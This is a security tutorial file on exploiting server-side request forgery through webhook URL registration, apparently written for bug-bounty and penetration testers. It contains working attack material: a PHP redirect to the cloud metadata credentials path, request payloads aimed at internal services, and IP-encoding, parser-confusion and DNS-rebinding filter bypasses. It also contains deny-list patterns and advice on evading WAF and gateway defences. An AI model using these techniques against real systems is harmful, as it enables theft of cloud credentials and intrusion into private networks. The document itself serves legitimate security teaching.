# Webhook Security — 01: SSRF via Webhook URL Registration

This file assumes you already know what SSRF is and how basic internal-network and cloud
metadata targeting works (covered in depth in the Web Application Security series' SSRF
file). This file applies that knowledge specifically to the webhook registration surface
described in file 00.

## 1. Why this surface is such a reliable SSRF source

Webhook URL fields are, structurally, one of the most attacker-friendly SSRF entry points
that exist, for three reasons:

1. **The feature's entire purpose is "take a URL from the user and have the server request
   it later."** Unlike, say, a profile picture upload that happens to fetch a URL as one
   possible code path, webhook registration is *designed* around accepting an arbitrary
   destination. Any validation has to be added deliberately; it's never the default.
2. **The request happens asynchronously, later, when an event fires** — not synchronously
   during the registration call. This matters a lot for testing: even if the registration
   endpoint returns `200 OK` for a malicious URL, that tells you nothing about what
   validation runs at *delivery* time. The two moments are often validated differently, or
   one of them isn't validated at all.
3. **The response often comes back to you.** Many webhook systems show delivery logs,
   response status codes, response bodies, or "test webhook" buttons in their dashboard —
   built explicitly so legitimate customers can debug their integration. That debugging
   feature is, from an attacker's perspective, a built-in SSRF response channel that
   doesn't even require blind exfiltration techniques.

## 2. Step-by-step: the core attack

### Step 1 — Find the webhook registration feature

Look for account/integration/developer settings pages, API endpoints under paths like
`/webhooks`, `/integrations`, `/notifications/callback`, `/hooks`, or parameters named
`webhook_url`, `callback_url`, `notify_url`, `endpoint_url`. Any feature that asks "where
should we send you notifications/events/callbacks" is a candidate.

### Step 2 — Register a webhook pointing at an address you control, first

Before attempting internal targeting, confirm the mechanism works and that you can observe
the request. Point the webhook at a request-catching service you control (Burp Collaborator,
`webhook.site`, an ngrok tunnel to a local listener):

```
POST /api/v1/account/webhooks HTTP/1.1
Host: target.example.com
Authorization: Bearer <your-token>
Content-Type: application/json

{
  "url": "https://<your-collaborator-id>.oastify.com/",
  "events": ["*"]
}
```

Trigger whatever event fires the webhook (place a test order, complete an action the app
supports, or use a "Test Webhook" button if one exists — many platforms provide this
precisely so you don't have to wait for a real event). Confirm the request lands on your
listener. This establishes: the feature works, you know what triggers delivery, and you
know what the request looks like (headers, method, any signature scheme in use).

### Step 3 — Redirect from your server to an internal target

This is the single most useful escalation technique and the one responsible for the Omise
disclosure referenced in file 00. Many applications validate the *registered* URL (block
`127.0.0.1`, `169.254.169.254`, RFC1918 ranges) but do not re-validate *where a redirect
from that URL leads*. Host a redirect on your own server:

```php
<?php
header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/', true, 303);
```

Why `303 See Other` specifically, rather than `301`/`302`: some HTTP client libraries treat
`303` differently from `301`/`302` in terms of which requests they'll follow without
re-checking a security policy that was only applied to the *original* destination — this
was the exact bypass in the Omise case. Test all of `301`, `302`, `303`, and `307` — client
libraries and any registration-time validators differ in which they special-case.

Register your redirector as the webhook URL:

```
POST /api/v1/account/webhooks HTTP/1.1
Host: target.example.com
Authorization: Bearer <your-token>
Content-Type: application/json

{
  "url": "https://your-redirector.example.net/redir",
  "events": ["*"]
}
```

Trigger the event. If the platform's outbound HTTP client follows the redirect
automatically (the common default in most HTTP libraries), it now requests
`169.254.169.254` directly, using the platform's own server identity, network position, and
IAM role if it's an AWS instance.

### Step 4 — Retrieve the response

This is where webhook-specific SSRF differs from generic SSRF: check the platform's own UI
first, before reaching for blind techniques. Many webhook dashboards show a "recent
deliveries" or "delivery log" panel with the full response body of each attempt, because
that's exactly what a legitimate developer needs to debug their integration. If the metadata
service returned an IAM role name and the response body is visible in that log, you have
direct, non-blind SSRF with full response disclosure — no DNS exfiltration or timing
inference required. This was exactly how the Omise credentials were retrieved: through the
platform's own webhook delivery log UI, not through a side channel.

### Step 5 — Escalate from metadata retrieval

Once you can reach `169.254.169.254` (AWS/most clouds) or `169.254.169.254`/`metadata.google.internal`
(GCP) or `169.254.169.254` (Azure IMDS, needs `Metadata: true` header — note header
injection into the *redirected* request is usually not possible this way, so Azure IMDS
access via redirect-based SSRF is often blocked by that header requirement even when the
SSRF itself works), walk the metadata tree to find temporary credentials, then use those
credentials from your own machine against the cloud provider's API to determine actual
blast radius (what does this IAM role/service account actually have access to). This step
is reconnaissance, not exploitation — document what's reachable, don't act beyond what's
needed to demonstrate impact.

## 3. Step-by-step: targeting internal services directly (no redirect needed)

If the registration endpoint performs no validation at all (common in earlier-stage
products, internal tools, or admin-only integrations that "surely no one will abuse"),
skip the redirect step entirely and register internal addresses directly:

```json
{ "url": "http://127.0.0.1:8080/admin/debug", "events": ["*"] }
{ "url": "http://localhost:6379/", "events": ["*"] }
{ "url": "http://10.0.0.5:9200/_cat/indices?v", "events": ["*"] }
```

Why these specific targets matter:

- `127.0.0.1`/`localhost` with an internal port — often reaches admin panels, debug
  endpoints, or metrics/health dashboards bound only to loopback under the assumption that
  "nothing external can reach loopback." A server-initiated webhook request *is* loopback
  traffic from the target's own perspective.
- Internal RFC1918 addresses (`10.x`, `172.16–31.x`, `192.168.x`) with ports for common
  internal services (Redis `6379`, Elasticsearch `9200`, internal admin APIs) — reachable
  because the webhook-sending server usually sits *inside* the same private network as
  these services, which is precisely why it can reach them and your browser can't.

Even blind delivery (no response visible anywhere) still leaks useful information through
**timing**: a request to a closed port typically fails fast (connection refused), while a
request to an open port that simply doesn't speak HTTP will hang until a timeout. Measuring
delivery latency across a range of registered ports is a slow but functional port scan —
the exact technique used in the IPv6/redirect Medium writeup referenced below, where the
researchers resorted to manual, timing-based port probing once automated tooling proved too
unreliable against the target's response jitter.

## 4. Bypassing basic URL validation

If registration *does* validate the URL, test each of these independently — implementations
frequently fix one and miss the others:

- **DNS rebinding** — register a hostname that resolves to a public IP at validation time,
  then to an internal IP at request time (short TTL, attacker-controlled DNS). This defeats
  any validator that resolves-and-checks once at registration but the actual HTTP client
  resolves again at delivery time. This is precisely the GitLab `UrlBlocker` bypass
  (HackerOne report #541169): the address was validated once, then a second DNS resolution
  happened when the HTTP client actually connected, and an attacker-controlled DNS server
  alternated answers between a safe address (to pass validation) and `169.254.169.254`
  (Digital Ocean's metadata endpoint, in that case) to be delivered on the second
  resolution. The report demonstrates using a fast/low-TTL resolver plus many parallel
  requests (via `wfuzz`) to win the race between the two resolutions often enough to succeed.
- **IPv6 and alternate address encodings** — internal-IP block lists frequently only check
  literal IPv4 dotted-decimal strings. Try the IPv4-mapped IPv6 form
  (`http://[::ffff:169.254.169.254]/`), decimal/octal/hex IP encodings
  (`http://2852039166/`, `http://0251.0.0.1/`), and, for loopback specifically,
  `http://0177.0.0.1/` or `http://[::1]/`. The IPv6-encoding bypass combined with a redirect
  is exactly the technique documented in the Red Darkin/madara_ writeup referenced below.
- **Alternate hostnames that resolve to blocked ranges** — `localtest.me`,
  `*.nip.io`/`*.sslip.io` wildcard-DNS services that resolve arbitrary embedded IPs
  (`169-254-169-254.nip.io` resolves to `169.254.169.254`), or simply registering your own
  domain with an A record pointing at the target range.
- **URL parser confusion** — validators that check the string before parsing sometimes
  disagree with the HTTP client's own URL parser about what host a URL like
  `http://trusted-domain.com@169.254.169.254/` or
  `http://169.254.169.254#@trusted-domain.com/` actually points to. Test any URL syntax
  ambiguity where a "safe-looking" domain appears in the string but a different host is
  what the connecting library actually uses.
- **Missing scheme/port restriction** — even if HTTP to internal IPs is blocked, test
  whether `https://`, `ftp://`, `gopher://`, `dict://`, or a non-standard port on an
  otherwise-allowed public-looking domain is accepted, particularly for gopher-based
  protocol smuggling if the underlying HTTP client supports fetching arbitrary schemes.

## 5. Blind SSRF confirmation when no response channel exists

If neither the delivery log UI nor any application behavior reveals the response, fall back
to out-of-band confirmation:

1. Register the webhook URL pointing to a domain you control that's wired to your
   Collaborator/interaction-tracking service.
2. Confirm the DNS lookup and/or HTTP hit lands, proving the server does make the request
   at all (this alone is often enough to report, even before proving internal reach).
3. Chain a redirect (Section 2, Step 3) from that same domain toward the internal/metadata
   target — you won't see the *internal* request's response, but successful delivery
   without an application-visible error, combined with a differential timing/error signal
   compared to a deliberately-invalid internal target, is enough to establish reachability.

## 6. WAF / API Gateway detection and bypass — full section (highly relevant here)

Unlike files 02 and 03, this vulnerability class has a clear, well-understood detection
surface, because the malicious payload — a URL string containing an internal IP, `localhost`,
or a known metadata address — has a recognizable pattern.

**How detection typically works:**

- **String/regex matching** on the registered URL against a deny-list: `127.0.0.1`,
  `localhost`, `169.254.169.254`, `metadata.google.internal`, RFC1918 CIDR ranges.
- **DNS resolution at validation time**, rejecting registration if the resolved IP falls in
  a blocked range.
- **Egress filtering at the network/gateway layer** — independent of application logic, some
  gateways or service meshes restrict what IP ranges the *webhook-sending service* is
  allowed to reach at the network level, which defeats SSRF regardless of any URL-string
  bypass, because even a successfully-registered malicious URL simply can't be routed to.
- **Managed webhook-delivery services** (increasingly common) that proxy outbound webhook
  calls through infrastructure specifically hardened against SSRF — re-resolving DNS
  immediately before connecting, refusing redirects by default, and enforcing egress
  allow-lists — precisely to close the redirect-based gap described in Section 2.

**Realistic bypass considerations against each:**

- Regex/deny-list matching is defeated by every technique in Section 4 — it's checking the
  wrong thing (the URL string) instead of the thing that actually matters (where the
  connection ends up going, checked at connection time, after all redirects and DNS
  resolutions are followed).
- Validate-then-resolve-again patterns are defeated by DNS rebinding (Section 4) —
  the fundamental fix is re-checking the resolved address at connection time, not at
  validation time, and many implementations still get this wrong.
- Network/egress-level filtering is the strongest control here because it doesn't depend on
  the application getting URL parsing right — but it's also the control least commonly
  implemented, because it requires infrastructure-level changes rather than an application
  code fix. When present, it can't be bypassed by URL trickery at all; testing for it means
  confirming whether *any* internal reach succeeds, not trying encoding tricks against it.
- Where a managed anti-SSRF proxy is in front of outbound webhook delivery, the practical
  bypass path shifts from "attacking the URL parser" to "attacking the redirect-following
  and DNS-timing edge cases in that specific proxy's implementation" — the general
  DNS-rebinding and redirect-status-code techniques above still apply to it as its own
  target, since the proxy is itself just another HTTP client with the same categories of
  possible mistakes.

## 7. PortSwigger lab mapping (Apprentice → Practitioner → Expert)

No PortSwigger lab is specifically about webhooks, but the SSRF category maps directly onto
every technique above, in order:

1. **Apprentice** — *SSRF with blacklist-based input filter* — directly practices the
   filter-bypass techniques in Section 4 (alternate IP encodings).
2. **Apprentice** — *SSRF with whitelist-based input filter* — practices URL-parser
   confusion (embedded credentials, fragment tricks) from Section 4.
3. **Practitioner** — *SSRF with filter bypass via open redirection vulnerability* — this
   is the redirect-chaining technique in Section 2, Step 3, in its purest form; do this lab
   before attempting the redirect technique against a real webhook target.
4. **Practitioner** — *Blind SSRF with out-of-band detection* — directly practices Section 5.
5. **Practitioner** — *Blind SSRF with Shellshock exploitation* — less directly relevant to
   webhooks specifically, but useful for understanding blind-SSRF-to-RCE chaining once
   internal reach is confirmed.
6. **Expert** — *SSRF with whitelist-based input filter (advanced parser confusion)* / the
   Expert-tier SSRF labs generally — practice the deepest parser-confusion and race-condition
   (DNS rebinding-adjacent) techniques.

**Honest gap:** none of these labs simulate the "webhook delivery log shows you the
response" dynamic from Section 2, Step 4, which is genuinely webhook-specific and doesn't
exist in a generic SSRF context — PortSwigger's SSRF labs are direct request/response, not
delayed asynchronous delivery with a separate log UI. Practicing that specific dynamic
requires a real webhook feature (crAPI, a personal test project, or an in-scope bug bounty
target) rather than PortSwigger.

## 8. Real-world notes

- **Omise, HackerOne #508459 (2019)** — webhook redirect-following (`303`) bypassed
  registration-time IP validation, reaching AWS instance metadata and retrieving IAM
  credentials, all visible through the platform's own webhook delivery log. Demonstrates
  Section 2 end to end.
- **GitLab, HackerOne #541169 (2019)** — `GitLab::UrlBlocker` validated the resolved address
  once, but the HTTP client (`GitLab::HTTP`) performed a second DNS resolution when actually
  connecting; an attacker-controlled low-TTL DNS server alternated between a safe answer and
  Digital Ocean's metadata address, won via repeated parallel requests. Demonstrates the DNS
  rebinding bypass in Section 4.
- **Mixmax, HackerOne #243277** — a webhook feature accepted `http://169.254.169.254/latest/meta-data/`
  directly with no internal-address filtering at all, confirmed simply by triggering the
  webhook (sending/receiving an email) and observing the metadata service's presence.
  Demonstrates Section 3 (no validation present at all — the simplest case, and still common).
- **Rocket.Chat, HackerOne #1886954 / CVE-2024-39713** — an *unauthenticated* SSRF through a
  Twilio integration webhook endpoint, showing that webhook-adjacent SSRF isn't limited to
  the registration-of-outbound-URL pattern — some webhook *receiver* endpoints themselves
  make further outbound requests based on inbound payload data, compounding the receiver-side
  risks in files 02–03 with registration-side SSRF risk in the same feature.
- **Red Darkin & madara_, "A Real SSRF Story from HackerOne" (Medium, 2026)** — a webhook
  implementation combined IPv6-encoded loopback (`[::ffff:a9fe:a9fe]`, the IPv4-mapped form
  of `169.254.169.254`) with a `303` redirect to defeat filtering that only checked literal
  IPv4 strings, then manually port-scanned the internal network via webhook delivery timing
  once automated tooling proved unreliable against inconsistent response latency.
  Demonstrates Sections 3, 4, and the blind-timing technique in Section 5 combined in one
  real engagement.

## Next

Continue to `02-Signature-Bypass-and-Replay-Attacks.md` for the receiver-side trust failures.
